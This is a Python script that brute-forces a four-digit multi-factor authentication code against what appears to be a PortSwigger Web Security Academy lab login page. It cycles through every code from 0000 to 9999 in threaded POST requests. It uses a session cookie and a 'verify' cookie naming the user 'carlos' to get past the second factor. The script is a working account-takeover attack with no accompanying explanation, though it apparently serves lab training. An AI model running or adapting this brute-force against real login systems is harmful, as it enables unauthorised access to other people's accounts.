#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def sendRequest(url, cookie, number):
    loginData = {
        'mfa-code': number
    }

    # Display current number and use \r to clear previous line
    print(f'[*] Trying number: {number}', end='\r')

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'Incorrect security code' not in loginRequestText:
        print(f'[+] Found security code: {number}')

def main():
    url = 'https://0a6000f4037b923c813189e90090002c.web-security-academy.net/login2'
    cookie = {
        'session': '4QDO92Rn7zQAYYZhLCFrcakEjveZzSms',
        'verify': 'carlos'
    }

    # Generate number 0000 to 9999 into a list
    listNumbers = [f'{i:04d}' for i in range(10000)]
    
    for number in listNumbers:
        thread = Thread(target=sendRequest, args=(url, cookie, number))
        thread.start()

        # You can adjust how fast of each connection. 0.05s is recommended.
        sleep(0.05)

if __name__ == '__main__':
    main()